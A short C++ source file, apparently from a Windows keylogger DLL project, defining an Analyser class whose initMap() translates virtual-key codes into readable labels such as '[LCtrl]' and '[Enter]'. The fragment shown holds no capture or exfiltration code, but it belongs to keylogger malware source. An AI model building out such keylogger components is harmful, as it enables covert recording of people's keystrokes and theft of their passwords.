
#include			"keylogger_dll\Analyser.h"

Analyser::Analyser()
{
}

Analyser::~Analyser()
{
}

void						Analyser::initMap()
{
	_translateMap[VK_CANCEL] = "[Cancel]";
	_translateMap[VK_SPACE] = " ";
	_translateMap[VK_LCONTROL] = "[LCtrl]";
	_translateMap[VK_RCONTROL] = "[RCtrl]";
	_translateMap[VK_LMENU] = "[LAlt]";
	_translateMap[VK_RMENU] = "[RAlt]";
	_translateMap[VK_LWIN] = "[LWindows]";
	_translateMap[VK_RWIN] = "[RWindows]";
	_translateMap[VK_APPS] = "[Applications]";
	_translateMap[VK_SNAPSHOT] = "[PrintScreen]";
	_translateMap[VK_INSERT] = "[Insert]";
	_translateMap[VK_PAUSE] = "[Pause]";
	_translateMap[VK_VOLUME_MUTE] = "[VolumeMute]";
	_translateMap[VK_VOLUME_DOWN] = "[VolumeDown]";
	_translateMap[VK_VOLUME_UP] = "[VolumeUp]";
	_translateMap[VK_SELECT] = "[Select]";
	_translateMap[VK_HELP] = "[Help]";
	_translateMap[VK_EXECUTE] = "[Execute]";
	_translateMap[VK_DELETE] = "[Delete]";
	_translateMap[VK_CLEAR] = "[Clear]";
	_translateMap[VK_RETURN] = "[Enter]";
	_translateMap[VK_BACK] = "[Backspace]";
	_translateMap[VK_TAB] = "[Tab]";
	_translateMap[VK_ESCAPE] = "[Escape]";
	_translateMap[VK_LSHIFT] = "[LShift]";
	_translateMap[VK_RSHIFT] = "[RShift]";
	_translateMap[VK_CAPITAL] = "[CapsLock]";
	_translateMap[VK_NUMLOCK] = "[NumLock]";
	_translateMap[VK_SCROLL] = "[ScrollLock]";
	_translateMap[VK_HOME] = "[Home]";
	_translateMap[VK_END] = "[End]";
	_translateMap[VK_PLAY] = "[Play]";
	_translateMap[VK_ZOOM] = "[Zoom]";
	_translateMap[VK_DIVIDE] = "[/]";
	_translateMap[VK_MULTIPLY] = "[*]";
	_translateMap[VK_SUBTRACT] = "[-]";
	_translateMap[VK_ADD] = "[+]";
}